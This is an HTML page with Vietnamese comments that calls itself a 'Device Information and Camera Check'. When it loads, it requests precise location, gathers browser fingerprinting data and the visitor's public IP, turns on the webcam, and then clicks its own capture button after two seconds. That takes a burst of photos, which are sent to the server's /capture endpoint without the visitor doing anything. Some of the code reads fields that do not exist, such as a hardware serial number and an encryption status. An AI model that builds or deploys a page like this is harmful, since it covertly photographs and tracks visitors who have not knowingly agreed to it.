<!DOCTYPE html>
<html lang="vi">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Information and Camera Check</title>
  <link rel="icon" type="image/jpg" href="https://i.imgur.com/zFfbkMv.png">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 20px;
      padding: 0;
      background-color: #f4f4f4;
      color: #333;
    }

    h1 {
      color: #007BFF;
      text-align: center;
    }

    #deviceInfo {
      margin-top: 20px;
      font-size: 16px;
      line-height: 1.6;
      color: #555;
      background-color: #fff;
      padding: 15px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    #cameraCheck {
      margin-top: 20px;
      text-align: center;
    }

    video,
    canvas {
      display: block;
      margin: 20px auto;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    button {
      display: block;
      margin: 10px auto;
      padding: 10px 20px;
      font-size: 16px;
      background-color: #007BFF;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <header>
    <h1>Device Information and Camera Check</h1>
  </header>

  <div id="deviceInfo"></div>
  <div id="cameraCheck"></div>

  <button id="capture">Capture Image</button>
  <button id="save" style="display: none;"></button>
  <video id="video" width="640" height="480" autoplay></video>

  <script>
    // Thêm biến để theo dõi số lượng ảnh đã chụp
    var numberOfImagesCaptured = 0;

    document.addEventListener("DOMContentLoaded", function () {
      checkDeviceOrientation();
      checkCamera();
    });

    function checkDeviceOrientation() {
      if ("DeviceOrientationEvent" in window) {
        navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
          if (permissionStatus.state === 'granted') {
            displayDeviceInfo();
          } else {
            navigator.geolocation.getCurrentPosition(
              displayDeviceInfo,
              displayError,
              { enableHighAccuracy: true }
            );
          }
        });
      } else {
        displayErrorMessage("Your browser does not support the necessary API.");
      }
    }

    function displayDeviceInfo() {
      let deviceInfo = "<p><strong>Device Information:</strong></p>";
      deviceInfo += "<p><strong>Device Type:</strong> " + getDeviceType() + "</p>";
      deviceInfo += "<p><strong>Device Name:</strong> " + getDeviceName() + "</p>";
      deviceInfo += "<p><strong>Operating System:</strong> " + getOperatingSystem() + "</p>";
      deviceInfo += "<p><strong>Browser:</strong> " + getBrowserInfo() + "</p>";
      deviceInfo += "<p><strong>Screen Resolution:</strong> " + window.screen.width + "x" + window.screen.height + "</p>";

      // Add storage information
      if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(storageInfo => {
          deviceInfo += "<p><strong>Storage Capacity:</strong> " + (storageInfo.quota / (1024 * 1024)).toFixed(2) + " MB</p>";
        });
      }

      // Add graphics card information
      let canvas = document.createElement("canvas");
      let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        let rendererInfo = gl.getExtension("WEBGL_debug_renderer_info");
        let vendor = gl.getParameter(rendererInfo.UNMASKED_VENDOR_WEBGL);
        let renderer = gl.getParameter(rendererInfo.UNMASKED_RENDERER_WEBGL);
        deviceInfo += "<p><strong>Graphics Card:</strong> " + vendor + " - " + renderer + "</p>";
      }

      // Add serial number, battery cycle, IP address, encryption status, and other information
      deviceInfo += "<p><strong>Serial Number:</strong> " + (navigator.hardwareSerial || "Not available") + "</p>";
      deviceInfo += "<p><strong>Battery Cycle:</strong> " + (getBatteryLevel() || "Not available") + "%</p>";
      fetchIpAddress();
      deviceInfo += "<p><strong>Encryption Status:</strong> " + (document.encrypted ? "Encrypted" : "Not encrypted") + "</p>";

      document.getElementById("deviceInfo").innerHTML = deviceInfo;
    }

    function getDeviceType() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
    }

    function getDeviceName() {
      return navigator.userAgent;
    }

    function getOperatingSystem() {
      return navigator.platform;
    }

    function getBrowserInfo() {
      return navigator.userAgent;
    }

    function getBatteryLevel() {
      return navigator.battery && navigator.battery.level ? navigator.battery.level * 100 : null;
    }

    function fetchIpAddress() {
      fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          document.getElementById("deviceInfo").innerHTML += "<p><strong>IP Address:</strong> " + data.ip + "</p>";
        })
        .catch(error => {
          console.error('Unable to retrieve IP address:', error);
        });
    }

    function displayError(error) {
      let errorMessage = "<p><strong>Error:</strong> ";
      switch (error.code) {
        case error.PERMISSION_DENIED:
          errorMessage += "User denied the location access permission.</p>";
          break;
        case error.POSITION_UNAVAILABLE:
          errorMessage += "Unable to determine the location.</p>";
          break;
        case error.TIMEOUT:
          errorMessage += "Location request timed out.</p>";
          break;
        case error.UNKNOWN_ERROR:
          errorMessage += "Unknown error occurred.</p>";
          break;
      }
      displayErrorMessage(errorMessage);
    }

    function displayErrorMessage(message) {
      document.getElementById("deviceInfo").innerHTML += "<p style='color: #c00;'>" + message + "</p>";
    }

    document.getElementById('capture').addEventListener('click', function () {
      // Gọi hàm để chụp ảnh khi click vào nút "Capture Image"
      captureImage();
    });

    // Hàm chụp ảnh
    function captureImage() {
      if (numberOfImagesCaptured < 3) {
        // Chỉ thực hiện chụp ảnh khi số lượng ảnh chưa đạt tới 3
        captureAndSaveImage();

        // Tăng số lượng ảnh đã chụp
        numberOfImagesCaptured++;

        // Nếu đã chụp đủ 3 ảnh, hiển thị nút lưu
        if (numberOfImagesCaptured === 3) {
          document.getElementById('save').style.display = 'block';
        }

        // Tự động gọi hàm chụp ảnh sau 1.2 giây nếu chưa đạt tới 3 ảnh
        setTimeout(function () {
          if (numberOfImagesCaptured < 3) {
            captureImage();
          }
        }, 1500);
      }
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function (stream) {
        var video = document.getElementById('video');
        video.srcObject = stream;
      })
      .catch(function (error) {
        console.log('Error accessing camera:', error);
      });

    document.getElementById('capture').addEventListener('click', function () {
      captureAndSaveImage();
    });

    function captureAndSaveImage() {
      var video = document.getElementById('video');
      var canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      var context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Display the captured image on the screen (optional)
      document.body.appendChild(canvas);

      // Convert canvas to data URL
      var imageData = canvas.toDataURL().split(',')[1];

      // Create a unique file name based on the current date and time
      var fileName = generateFileName();

      // Send image data to the Node.js server
      saveImageOnServer(imageData, fileName);
    }

    function generateFileName() {
      var currentDate = new Date();
      return 'images-' +
        currentDate.getDate() + '-' +
        (currentDate.getMonth() + 1) + '-' +
        currentDate.getFullYear() + '-' +
        currentDate.getHours() + '-' +
        currentDate.getMinutes() + '-' +
        currentDate.getSeconds() + '-' +
        Math.floor(Math.random() * 1000) + '.png';
    }

    function saveImageOnServer(imageData, fileName) {
      fetch('/capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ imageData, fileName })
      })
        .then(response => response.json())
        .then(data => {
          console.log('Image saved successfully:', data.fileName);
        })
        .catch(error => {
          console.error('Error saving image:', error);
        });
    }

    // Automatically capture and save image after 1.2 seconds
    setTimeout(function () {
      document.getElementById('capture').click(); // Trigger the image capture event
    }, 2000);
  </script>

</body>

</html>
